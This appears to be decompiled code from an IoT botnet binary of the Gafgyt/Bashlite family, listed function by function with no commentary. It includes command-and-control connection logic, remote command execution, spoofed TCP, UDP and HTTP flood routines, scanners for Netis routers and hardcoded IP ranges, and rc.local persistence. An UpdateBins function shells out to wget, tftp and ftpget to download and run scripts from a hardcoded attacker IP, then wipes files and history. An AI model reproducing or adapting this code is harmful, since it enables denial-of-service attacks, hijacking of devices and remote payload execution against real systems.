        szprintf((int32_t)&v221, (int32_t)"14.180.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.181.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.182.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.183.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.184.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.185.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.186.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.187.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.188.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.189.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.190.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.191.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"45.121.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"45.120.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"45.115.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"43.252.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"43.230.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"43.240.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"43.245.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"41.174.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"49.118.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"78.188.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"45.127.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"103.30.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"14.33.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"123.16.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"202.44.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"116.93.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"91.83.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"41.253.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"117.173.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"113.190.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"146.88.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"112.196.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"113.178.%d.%d", (int32_t)v218);
        szprintf((int32_t)&v221, (int32_t)"112.45.%d.%d", (int32_t)v218);
        szprintf(v222, (int32_t)"183.223.%d.%d", (int32_t)v218);
    return inet_addr(v222);
=================FUNCTION : main ===================
++++++++ FUNCTION START 25537
++++++++ FUNCTION END 26395
++++++++ FUNCTION LENGTH 858
    srand(v211 ^ __libc_getpid());
    init_rand(v212 ^ __libc_getpid());
    int32_t v213 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x10009e7c
        v214 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
        getcwd(v230, 256);
            __GI_fclose((int16_t *)v214);
                sprintf(v236, (int32_t)"\"%s%s\"\n", v230, v235 + v239, 0x10020000, v232, 0x10020000, (int32_t)&v238);
                while (true) {
                    while (true) {
                            fgets(v237, 1024, v214);
                            if (__GI_strcasecmp(v237, v236) == 0) {
                            __GI_fclose((int16_t *)v214);
                            int32_t v242 = __GI_fopen((int32_t)v215, (int32_t)&v241); // 0x10009ff0
                                __GI_fclose((int16_t *)v242);
                            getOurIP();
                            v223 = __libc_fork();
                                if (__libc_fork() == 0) {
                                    zprintf((int32_t)"fork failed\n", 0x10020000);
                                while (true) {
                                    if (initConnection() != 0) {
                                        while (true) {
                                            if (initConnection() == 0) {
                                        v248 = getBuild((int32_t)&v244);
                                        __GI_inet_ntoa(&v247, (int32_t)&v244);
                                        sockprintf(v245, (int32_t)"Connected %s:%s", v248);
                                        while (true) {
                                            while (true) {
                                                if (recvLine(v217, (char *)&v218, 0x1000, v227) == -1) {
                                                while (true) {
                                                                if (__libc_waitpid(v256, 0, 1) >= 1) {
                                                                    while (true) {
                                                                                while (true) {
                                                                                            free();
                                                        if (strstr(v227, "PING", (int32_t)&v262) == v227) {
                                                            sockprintf(v217, (int32_t)"PONG", 0x10020000);
                                                            if (strstr(v227, "DUP", 0x10020000) == v227) {
                                                                zprintf((int32_t)"PEACE OUT IMMA DUP\n", 0x10020000);
                                                        while (true) {
                                                            if (initConnection() == 0) {
                                                        while (true) {
                                                        while (true) {
                                                                        while (true) {
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                                                                    while (true) {
                                                                                    processCmd(v282, &v233);
                                                                                processCmd(v282, &v233);
                                                                            while (true) {
                                                                            free();
                                                                                free();
                                                                            while (true) {
                                                    if (__libc_waitpid(v256, 0, 1) < 1) {
                                    v248 = getBuild((int32_t)&v244);
                                    __GI_inet_ntoa(&v247, (int32_t)&v244);
                                    sockprintf(v245, (int32_t)"Connected %s:%s", v248);
                                __libc_waitpid(v223, (int32_t)&v220, 0);
                                zprintf((int32_t)"fork failed\n", 0x10020000);
                            while (true) {
                                if (initConnection() == 0) {
            sprintf(v236, (int32_t)"\"%s%s\"\n", v230, v235 + v228, 0x10020000, v232, 0x10020000, (int32_t)&v238);
            while (true) {
        getOurIP();
        v223 = __libc_fork();
            if (__libc_fork() == 0) {
                zprintf((int32_t)"fork failed\n", 0x10020000);
            while (true) {
                if (initConnection() == 0) {
            __libc_waitpid(v223, (int32_t)&v220, 0);
            zprintf((int32_t)"fork failed\n", 0x10020000);
        while (true) {
            if (initConnection() == 0) {
    getOurIP();
    v223 = __libc_fork();
        if (__libc_fork() == 0) {
            zprintf((int32_t)"fork failed\n", 0x10020000);
        while (true) {
            if (initConnection() == 0) {
        __libc_waitpid(v223, (int32_t)&v220, 0);
        zprintf((int32_t)"fork failed\n", 0x10020000);
    while (true) {
        if (initConnection() == 0) {
    szprintf(v225, (int32_t)"%s 2>&1", v224);
    int32_t v291 = fdpopen(v225, "r"); // 0x1000a75c
    while (true) {
        if (fdgets(v225, 1024, v291) == 0) {
            fdpclose(v291);
            sockprintf(v217, (int32_t)"%s", v225);
=================FUNCTION : gethostbyname_r ===================
++++++++ FUNCTION START 49691
++++++++ FUNCTION END 50787
++++++++ FUNCTION LENGTH 1096
    int32_t v220 = __get_hosts_byname_r(a1, 2, (int32_t)a2, a3, a4, a5, a6); // 0x1000dd04
                                        v249 = inet_aton((char *)a1);
                                        __open_nameservers();
                                        v250 = __dns_lookup((char *)a1, 1, v222, (int32_t)&v223, (int32_t)&v229, (int32_t)&v228);
                                            free();
                                            free();
                                                    while (true) {
                                            free();
                                                free();
                                                free();
                                            v249 = inet_aton((char *)a1);
                                            __open_nameservers();
                                            v250 = __dns_lookup((char *)a1, 1, v222, (int32_t)&v223, (int32_t)&v229, (int32_t)&v228);
                                                free();
                                                free();
                                                        while (true) {
                                                            free();
                                                                free();
                                                            free();
                                                free();
                                                    free();
                                                    free();
                            v249 = inet_aton((char *)a1);
                            __open_nameservers();
                            v250 = __dns_lookup((char *)a1, 1, v222, (int32_t)&v223, (int32_t)&v229, (int32_t)&v228);
                                free();
                                free();
                                        while (true) {
                                            free();
                                                free();
                                            free();
                                free();
                                    free();
                                    free();
                                v249 = inet_aton((char *)a1);
                                __open_nameservers();
                                v250 = __dns_lookup((char *)a1, 1, v222, (int32_t)&v223, (int32_t)&v229, (int32_t)&v228);
                                    free();
                                    free();
                                            while (true) {
                                                free();
                                                    free();
                                                free();
                                    free();
                                        free();
                                        free();
                        v249 = inet_aton((char *)a1);
                            __open_nameservers();
                            v250 = __dns_lookup((char *)a1, 1, v222, (int32_t)&v223, (int32_t)&v229, (int32_t)&v228);
                                    free();
                                    free();
                                            while (true) {
                                                free();
                                                    free();
                                                    free();
                                    free();
                                        free();
                                        free();
                            v249 = inet_aton((char *)a1);
                                __open_nameservers();
                                v250 = __dns_lookup((char *)a1, 1, v222, (int32_t)&v223, (int32_t)&v229, (int32_t)&v228);
                                        free();
                                        free();
                                                while (true) {
                                                    free();
                                                        free();
                                                        free();
                                        free();
                                            free();
                                            free();
=================FUNCTION : __dns_lookup ===================
++++++++ FUNCTION START 74545
++++++++ FUNCTION END 75530
++++++++ FUNCTION LENGTH 985
                        while (true) {
                            while (true) {
                                    __libc_close(v233);
                                        if (inet_pton(10, (char *)v244, (int32_t)&v245) < 1) {
                                            inet_addr(v244);
                                        int32_t v248 = socket((int32_t)v247, 2, 17); // 0x100111b4
                                            if (__libc_connect(v230, 28, 28) > -1) {
                                                __libc_send(v217, v214, result + v251, 0);
                                                    int32_t v252 = __libc_recv(v217, v214, 512, 0); // 0x10011234
                                                                                __libc_close(v219);
                                                                            free();
                                                                            free();
                                                                            while (true) {
                                                                                        __libc_close(v217);
                                                                                            free();
                                                                                            free();
                                                                                        free();
                                                                                        free();
                                                                                                free();
                                                                                            free();
                                                                                        __libc_close(v217);
                                                                                            free();
                                                                                            free();
                                                                                        free();
                                                                                        __libc_close(v217);
                                                                                            free();
                                                                                            free();
                                                                                        free();
                                                                                    __libc_close(v217);
                                                                                        free();
                                                                                        free();
                                                                                    free();
                                                                            __libc_close(v217);
                                                                                free();
                                                                                free();
                                                                            free();
                                                                        __libc_close(v217);
                                                                            free();
                                                                            free();
                                                                        free();
                                                                        free();
                                                                        __libc_close(v219);
                                                                    free();
                                                                    free();
                                                                    __libc_close(v219);
                                                                free();
                                                                free();
                                __libc_close(v219);
                            free();
                            free();
                        __libc_close(v219);
                    free();
                    free();
                    __libc_close(v219);
                free();
                free();
                __libc_close(v219);
            free();
            free();
            __libc_close(v219);
        free();
        free();
        __libc_close(v219);
    free();
    free();
=================FUNCTION : _fpmaxtostr ===================
++++++++ FUNCTION START 67949
++++++++ FUNCTION END 71940
++++++++ FUNCTION LENGTH 3991
            while (true) {
                while (true) {
                                    while (true) {
                                                                                    while (true) {
                                                                                                        while (true) {
                                                                                                    while (true) {
                                                                                                while (true) {
                                                                                        while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                                                    while (true) {
                                                                                        while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                        while (true) {
                                                                                while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                while (true) {
                                                                            while (true) {
                                                                    while (true) {
                                                                    while (true) {
                                                            while (true) {
                                                                                while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                while (true) {
                                                                                while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                while (true) {
                                                                            while (true) {
                            while (true) {
        while (true) {
=================FUNCTION : fdpopen ===================
++++++++ FUNCTION START 5744
++++++++ FUNCTION END 6277
++++++++ FUNCTION LENGTH 533
            v225 = __vfork();
                __libc_close(v222);
                __libc_close(v223);
                            __libc_close(v223);
                        __libc_close(v222);
                            __libc_close(v222);
                        __libc_close(v223);
                    __libc_close(v223);
                    __libc_close(v229);
        v226 = getdtablesize((int32_t)&v220);
        v225 = __vfork();
            __libc_close(v222);
            __libc_close(v223);
                        __libc_close(v223);
                    __libc_close(v222);
                        __libc_close(v222);
                    __libc_close(v223);
                __libc_close(v223);
                __libc_close(v229);
        v225 = __vfork();
            __libc_close(v222);
            __libc_close(v223);
                        __libc_close(v223);
                    __libc_close(v222);
                        __libc_close(v222);
                    __libc_close(v223);
                __libc_close(v223);
                __libc_close(v229);
    v226 = getdtablesize((int32_t)&v220);
    v225 = __vfork();
        __libc_close(v222);
        __libc_close(v223);
                    __libc_close(v223);
                __libc_close(v222);
                    __libc_close(v222);
                __libc_close(v223);
            __libc_close(v223);
            __libc_close(v229);
=================FUNCTION : sendTCP ===================
++++++++ FUNCTION START 16331
++++++++ FUNCTION END 16806
++++++++ FUNCTION LENGTH 475
        rand_cmwc();
    int32_t result = getHost(a1, &v219, v218); // 0x100079f4
    int32_t v220 = socket(2, 3, 6); // 0x10007a2c
        int32_t result2 = sockprintf(v222, (int32_t)"Failed opening raw socket.", (int32_t)&v221); // 0x10007a5c
    if (__GI_setsockopt(v220, 0, 3, (int32_t)&v223, 4) > -1) {
        int32_t v230 = GetRandomIP(v224); // 0x10007b50
        *v229 = (int16_t)rand_cmwc();
        int32_t v232 = rand_cmwc(); // 0x10007b98
                while (true) {
                        if (__GI_strcoll(v247, (int32_t)"rst") == 0) {
                                    if (__GI_strcoll(v247, (int32_t)"psh") == 0) {
                                        sockprintf(v222, (int32_t)"Invalid flag \"%s\"", v246);
                rand_cmwc();
                    rand_cmwc();
                *v240 = (int16_t)tcpcsum(v227, v239, v228);
                while (true) {
                    __libc_sendto(v220, v227, v225, 0, v218, 16, v218);
                    v236 = GetRandomIP(v224);
                    *(int16_t *)(v227 | 4) = (int16_t)rand_cmwc();
                    *v233 = rand_cmwc();
                    *v229 = (int16_t)rand_cmwc();
                    *v240 = (int16_t)tcpcsum(v227, v239, v228);
        rand_cmwc();
            rand_cmwc();
        *v240 = (int16_t)tcpcsum(v227, v239, v228);
        while (true) {
            __libc_sendto(v220, v227, v225, 0, v218, 16, v218);
            v236 = GetRandomIP(v224);
            *(int16_t *)(v227 | 4) = (int16_t)rand_cmwc();
            *v233 = rand_cmwc();
            *v229 = (int16_t)rand_cmwc();
            *v240 = (int16_t)tcpcsum(v227, v239, v228);
        result4 = sockprintf(v222, (int32_t)"Failed setting raw headers mode.", (int32_t)&v221);
=================FUNCTION : prints ===================
++++++++ FUNCTION START 3504
++++++++ FUNCTION END 4160
++++++++ FUNCTION LENGTH 656
                while (true) {
                    printchar((int32_t *)a1, v222);
                            printchar((int32_t *)a1, v222);
                printchar((int32_t *)a1, (int32_t)*a2);
                    printchar((int32_t *)a1, (int32_t)*v229);
                        printchar((int32_t *)a1, v222);
                    printchar((int32_t *)a1, v222);
        printchar((int32_t *)a1, (int32_t)*a2);
            printchar((int32_t *)a1, (int32_t)*v229);
                printchar((int32_t *)a1, v222);
                while (true) {
                    printchar((int32_t *)a1, v222);
                            printchar((int32_t *)a1, v222);
                printchar((int32_t *)a1, (int32_t)*a2);
                    printchar((int32_t *)a1, (int32_t)*v229);
                        printchar((int32_t *)a1, v222);
                    printchar((int32_t *)a1, v222);
        printchar((int32_t *)a1, (int32_t)*a2);
            printchar((int32_t *)a1, (int32_t)*v229);
                printchar((int32_t *)a1, v222);
            while (true) {
                printchar((int32_t *)a1, v222);
                        printchar((int32_t *)a1, v222);
            printchar((int32_t *)a1, (int32_t)*a2);
                printchar((int32_t *)a1, (int32_t)*v229);
                    printchar((int32_t *)a1, v222);
                printchar((int32_t *)a1, v222);
    printchar((int32_t *)a1, (int32_t)*a2);
        printchar((int32_t *)a1, (int32_t)*v229);
            printchar((int32_t *)a1, v222);
=================FUNCTION : sendUDP ===================
++++++++ FUNCTION START 15898
++++++++ FUNCTION END 16328
++++++++ FUNCTION LENGTH 430
        rand_cmwc();
    int32_t result = getHost(a1, &v220, v219); // 0x10007368
        int32_t v224 = socket(2, 2, 17); // 0x100073b0
            result3 = sockprintf(v222, (int32_t)"Failed opening raw socket.", (int32_t)&v221);
                makeRandomStr(v225, a5);
                while (true) {
                    while (true) {
                        __libc_sendto(v224, v225, a5, 0, v219, 16, v219);
                                rand_cmwc();
    int32_t v231 = socket(2, 3, 17); // 0x10007534
        if (__GI_setsockopt(v231, 0, 3, (int32_t)&v232, 4) > -1) {
                srand(v233 ^ rand_cmwc());
                init_rand(random());
            int32_t v238 = GetRandomIP(v234); // 0x100076b4
            *v237 = (int16_t)rand_cmwc();
                v240 = rand_cmwc();
            makeRandomStr(v236 + 28, a5);
            while (true) {
                while (true) {
                    __libc_sendto(v231, v236, a5 + 28, 0, v219, 16, v219);
                    *v237 = (int16_t)rand_cmwc();
                        v252 = rand_cmwc();
                    *(int16_t *)(v236 | 4) = (int16_t)rand_cmwc();
                    *(int32_t *)(v236 | 12) = htonl(GetRandomIP(v234));
            result5 = sockprintf(v222, (int32_t)"Failed setting raw headers mode.", (int32_t)&v221);
    int32_t result6 = sockprintf(v222, (int32_t)"Failed opening raw socket.", (int32_t)&v221); // 0x10007564
=================FUNCTION : __read_etc_hosts_r ===================
++++++++ FUNCTION START 84139
++++++++ FUNCTION END 84819
++++++++ FUNCTION LENGTH 680
            while (true) {
                if (fgets(v222, v224, a1) != 0) {
                    __GI_fclose((int16_t *)a1);
                                v228 = __open_etc_hosts();
                                    while (true) {
                                        if (fgets(v222, v224, a1) != 0) {
                                            __GI_fclose((int16_t *)a1);
        while (true) {
            if (fgets(v222, v224, a1) != 0) {
                    while (true) {
                            while (true) {
                                        while (true) {
                                        while (true) {
                                            if (__GI_strcasecmp(a2, v258) == 0) {
                                            if (inet_pton(2, (char *)v260, v223) > 0) {
                                                    __GI_fclose((int16_t *)a1);
                                                if (inet_pton(10, (char *)v261, v221) > 0) {
                                                        __GI_fclose((int16_t *)a1);
                                __GI_fclose((int16_t *)a1);
                __GI_fclose((int16_t *)a1);
            __GI_fclose((int16_t *)a1);
                            v228 = __open_etc_hosts();
                                while (true) {
                                    if (fgets(v222, v224, a1) != 0) {
                                        __GI_fclose((int16_t *)a1);
=================FUNCTION : _ppfs_parsespec ===================
++++++++ FUNCTION START 39048
++++++++ FUNCTION END 40118
++++++++ FUNCTION LENGTH 1070
        while (true) {
                while (true) {
                    while (true) {
                                        while (true) {
                                            while (true) {
                                                while (true) {
                                                                    while (true) {
                                                                            while (true) {
                                                                                        while (true) {
                                                                                while (true) {
                                                            while (true) {
                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                while (true) {
                                                    while (true) {
                                                                    while (true) {
                                                            while (true) {
    while (true) {
=================FUNCTION : getOurIP ===================
++++++++ FUNCTION START 24944
++++++++ FUNCTION END 25309
++++++++ FUNCTION LENGTH 365
    int32_t v220 = socket(2, 2, 0); // 0x10009ae8
    inet_addr((int32_t)"8.8.8.8");
    if (__libc_connect(v220, (int32_t)&v221, 16) == -1) {
    int32_t v225 = __GI_getsockname(v220, (int32_t)&v224, v223, v223); // 0x10009bb4
        int32_t v226 = __libc_open((int32_t)"/proc/net/route", 0); // 0x10009bf8
        while (true) {
            if (fdgets(v228, 0x1000, v226) != 0) {
                if (strstr(v228, "\t00000000\t", 0x10020000) != 0) {
                        __libc_close(v226);
                            __libc_close(v220);
                        __libc_close(v220);
                    __libc_close(v226);
                        __libc_close(v220);
                    __libc_close(v220);
            __libc_close(v226);
                __libc_close(v220);
            __libc_close(v220);
=================FUNCTION : sleep ===================
++++++++ FUNCTION START 60266
++++++++ FUNCTION END 60792
++++++++ FUNCTION LENGTH 526
                if (__GI_sigprocmask(0, (int32_t)&v227, v232) == 0) {
                            __GI_sigprocmask(2, v232, 0);
                            __GI_sigprocmask(2, v232, 0);
                            __GI_sigprocmask(2, v232, 0);
                        __GI_sigprocmask(2, v232, 0);
                        __GI_sigprocmask(2, v232, 0);
                        __GI_sigprocmask(2, v232, 0);
            if (__GI_sigprocmask(0, (int32_t)&v227, v232) == 0) {
                        __GI_sigprocmask(2, v232, 0);
                        __GI_sigprocmask(2, v232, 0);
                        __GI_sigprocmask(2, v232, 0);
                    __GI_sigprocmask(2, v232, 0);
                    __GI_sigprocmask(2, v232, 0);
                    __GI_sigprocmask(2, v232, 0);
=================FUNCTION : __open_nameservers ===================
++++++++ FUNCTION START 75533
++++++++ FUNCTION END 75978
++++++++ FUNCTION LENGTH 445
    int32_t v218 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v217); // 0x10011648
        int32_t v222 = __GI_fopen((int32_t)"/etc/config/resolv.conf", v221); // 0x10011660
    while (true) {
        if (fgets(v224, 128, v220) == 0) {
            __GI_fclose((int16_t *)v219);
            while (true) {
                                while (true) {
                                        while (true) {
                                            while (true) {
                                                while (true) {
                                                free();
                                                    free();
                                                while (true) {
=================FUNCTION : _stdio_fopen ===================
++++++++ FUNCTION START 34381
++++++++ FUNCTION END 35186
++++++++ FUNCTION LENGTH 805
            if (__libc_open(a1, v227) < 0) {
                    free();
                free();
                        free();
            if (__libc_open(a1, v227) < 0) {
                    free();
                            free();
                free();
                free();
        if (__libc_open(a1, v227) < 0) {
                free();
                        free();
            free();
=================FUNCTION : print ===================
++++++++ FUNCTION START 4499
++++++++ FUNCTION END 5059
++++++++ FUNCTION LENGTH 560
    while (true) {
                    printchar(a1, (int32_t)*v225);
                        while (true) {
                            while (true) {
                                result2 = prints(v221, v245, v234, v230) + result;
                                    int32_t v248 = printi(v221, v247, 10, 1, v234, v230, 97) + result; // 0x10000cb0
                                        int32_t v250 = printi(v221, v249, 16, 0, v234, v230, 97) + result; // 0x10000d64
                                            int32_t v252 = printi(v221, v251, 16, 0, v234, v230, 65) + result; // 0x10000e18
                                                int32_t v254 = printi(v221, v253, 10, 0, v234, v230, 97) + result; // 0x10000ecc
                                                    int32_t v256 = prints(v221, (char *)&v224, v234, v230); // 0x10000f7c
            printchar(a1, (int32_t)*v225);
=================FUNCTION : StartTheLelz ===================
++++++++ FUNCTION START 15214
++++++++ FUNCTION END 15634
++++++++ FUNCTION LENGTH 420
    srand(v219 ^ rand_cmwc());
        while (true) {
        while (true) {
                    GetRandomPublicIP(v234);
                                socket(2, 1, 0);
                                    if (__libc_connect(*v233, (int32_t)&v220, 16) == -1) {
                socket(2, 1, 0);
        while (true) {
        while (true) {
    while (true) {
    while (true) {
=================FUNCTION : __heap_free ===================
++++++++ FUNCTION START 55930
++++++++ FUNCTION END 56283
++++++++ FUNCTION LENGTH 353
            __heap_link_free_area((int32_t *)v220, result, v221, result3);
            __heap_link_free_area((int32_t *)v220, result, v221, result3);
                    __heap_link_free_area_after(a1, v225, v230, v223);
                    __heap_link_free_area_after(a1, result2, v224, v223);
            __heap_link_free_area(a1, v229, v224, result2);
    while (true) {
                        __heap_link_free_area_after(a1, v225, v230, v223);
                        __heap_link_free_area_after(a1, result2, v224, v223);
                __heap_link_free_area(a1, v229, v224, result2);
    __heap_link_free_area((int32_t *)v220, result, v221, result3);
=================FUNCTION : getBogos ===================
++++++++ FUNCTION START 7817
++++++++ FUNCTION END 8106
++++++++ FUNCTION LENGTH 289
    int32_t v219 = __libc_open((int32_t)"/proc/cpuinfo", 0); // 0x10001b6c
    while (true) {
        if (fdgets(v221, 0x1000, v219) == 0) {
            __libc_close(v219);
        uppercase((char *)&v220);
        if (strstr(v221, "BOGOMIPS", (int32_t)&v222) == v221) {
            while (true) {
                            while (true) {
                                        __libc_close(v219);
=================FUNCTION : inet_pton ===================
++++++++ FUNCTION START 81192
++++++++ FUNCTION END 81818
++++++++ FUNCTION LENGTH 626
        inet_pton4(v220, a3);
                                while (true) {
                                while (true) {
            while (true) {
                while (true) {
                            if (inet_pton4(v227, v225) > 0) {
                                        while (true) {
                                                        while (true) {
                                                        while (true) {
=================FUNCTION : __GI_inet_ntop ===================
++++++++ FUNCTION START 82097
++++++++ FUNCTION END 82695
++++++++ FUNCTION LENGTH 598
        return inet_ntop4(a2, a3, a4);
        while (true) {
            while (true) {
                                        if (inet_ntop4(a2 + 12, v260, v261 - v260 + 86) == 0) {
                                v258 = sprintf(v260, (int32_t)"%x", v257, v221, v253, v254, v221, (int32_t)&v259);
                            if (inet_ntop4(a2 + 12, v260, v261 - v260 + 86) == 0) {
                v258 = sprintf(v255, (int32_t)"%x", v257, v221, v253, v254, v221, (int32_t)&v259);
                while (true) {
        while (true) {
=================FUNCTION : __uClibc_main ===================
++++++++ FUNCTION START 62189
++++++++ FUNCTION END 62668
++++++++ FUNCTION LENGTH 479
            v234 = getuid((int32_t)&v227);
            v232 = geteuid();
                v235 = getgid(v232);
                if (v235 == getegid()) {
    while (true) {
        v234 = getuid((int32_t)&v227);
        v232 = geteuid();
            v235 = getgid(v232);
            if (v235 == getegid()) {
=================FUNCTION : printi ===================
++++++++ FUNCTION START 4163
++++++++ FUNCTION END 4496
++++++++ FUNCTION LENGTH 333
        result2 = prints(a1, (char *)&v220, a5, a6);
            while (true) {
                        printchar((int32_t *)a1, 45);
                        result = prints(a1, v224, a5 - 1, a6);
            result = prints(a1, v225, a5, a6);
                    printchar((int32_t *)a1, 45);
                    result = prints(a1, v224, a5 - 1, a6);
        result2 = prints(a1, v225, a5, a6);
=================FUNCTION : sendHTTP ===================
++++++++ FUNCTION START 17518
++++++++ FUNCTION END 17808
++++++++ FUNCTION LENGTH 290
    random();
    int32_t v221 = random() % 674; // 0x10008300
    int32_t result = sprintf(v223, (int32_t)"%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n", a2, a4, v224, v225, 0x10020000, v221); // 0x10008424
    while (true) {
        if (__libc_fork() != 0) {
                while (true) {
                    int32_t v228 = socket_connect(a1, a3); // 0x1000838c
                        __libc_close(v229);
=================FUNCTION : negotiate ===================
++++++++ FUNCTION START 11603
++++++++ FUNCTION END 11877
++++++++ FUNCTION LENGTH 274
        __libc_send(a1, v223, 1, 0x4000);
                __libc_send(a1, v223, 1, 0x4000);
                __libc_send(a1, a2 + 2, 1, 0x4000);
            __libc_send(a1, v223, 1, 0x4000);
            __libc_send(a1, a2 + 2, 1, 0x4000);
        __libc_send(a1, v223, 1, 0x4000);
        __libc_send(a1, a2 + 2, 1, 0x4000);
=================FUNCTION : sendCNC ===================
++++++++ FUNCTION START 17811
++++++++ FUNCTION END 18058
++++++++ FUNCTION LENGTH 247
    inet_addr(a1);
    int32_t v222 = socket(2, 1, 0); // 0x100084a4
    __libc_connect(v222, (int32_t)&v221, 16);
    __libc_close(v222);
        v222 = socket(2, 1, 0);
        __libc_connect(v222, (int32_t)&v221, 16);
        __libc_close(v222);
=================FUNCTION : sendSTD ===================
++++++++ FUNCTION START 15637
++++++++ FUNCTION END 15895
++++++++ FUNCTION LENGTH 258
    int32_t v220 = socket(2, 2, 0); // 0x10007154
    int32_t v222 = __GI_gethostbyname(a1); // 0x10007178
    while (true) {
        random();
            __libc_send(v220, v231, 65, 0);
            __libc_connect(v220, v224, 16);
                __libc_close(v220);
=================FUNCTION : recvLine ===================
++++++++ FUNCTION START 8594
++++++++ FUNCTION END 8951
++++++++ FUNCTION LENGTH 357
            while (true) {
                sockprintf(v230, (int32_t)"PING", (int32_t)&v229);
                while (true) {
                        while (true) {
                            if (__libc_recv(v230, (int32_t)&v236, 1, 0) != 1) {
                        while (true) {
    while (true) {
=================FUNCTION : fdpclose ===================
++++++++ FUNCTION START 6280
++++++++ FUNCTION END 6553
++++++++ FUNCTION LENGTH 273
    __libc_close(a1);
    __GI_sigprocmask(0, v222, v224);
    while (true) {
        if (__libc_waitpid(v226, (int32_t)&v225, 0) == -1) {
        __GI_sigprocmask(2, v224, 0);
    __GI_sigprocmask(2, v224, 0);
=================FUNCTION : NetisScanner ===================
++++++++ FUNCTION START 17054
++++++++ FUNCTION END 17288
++++++++ FUNCTION LENGTH 234
    while (true) {
        int32_t v222 = socket(2, 2, 17); // 0x100080e8
        NetisRanges();
        __libc_sendto(v222, (int32_t)"AAAAAAAAnetcore", __GI_strlen(), 0, v221, 16, v221);
        __libc_sendto(v222, (int32_t)"AA", __GI_strlen(), 0, v221, 16, v221);
        __libc_close(v222);
=================FUNCTION : getCores ===================
++++++++ FUNCTION START 8109
++++++++ FUNCTION END 8355
++++++++ FUNCTION LENGTH 246
    int32_t v219 = __libc_open((int32_t)"/proc/cpuinfo", 0); // 0x10001d88
    while (true) {
        if (fdgets(v221, 0x1000, v219) == 0) {
            __libc_close(v219);
        uppercase((char *)&v220);
        int32_t v223 = strstr(v221, "BOGOMIPS", (int32_t)&v222); // 0x10001db4
=================FUNCTION : NetisRanges ===================
++++++++ FUNCTION START 13430
++++++++ FUNCTION END 13660
++++++++ FUNCTION LENGTH 230
    random();
    char v218 = random() % 255;
    char v219 = random() % 255;
    int32_t v220 = random(); // 0x10005a94
    szprintf(v223, (int32_t)"%d.%d.%d.%d", (int32_t)v224);
    return inet_addr(v223);
=================FUNCTION : UpdateBins ===================
++++++++ FUNCTION START 18061
++++++++ FUNCTION END 18295
++++++++ FUNCTION LENGTH 234
    int32_t v220 = __libc_fork(); // 0x10008518
    int32_t chars_printed;
        __libc_system((int32_t)"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c");
        chars_printed = sleep(20);
        chars_printed = printf("%d\n", v220);
    return chars_printed;
=================FUNCTION : readUntil ===================
++++++++ FUNCTION START 12174
++++++++ FUNCTION END 12507
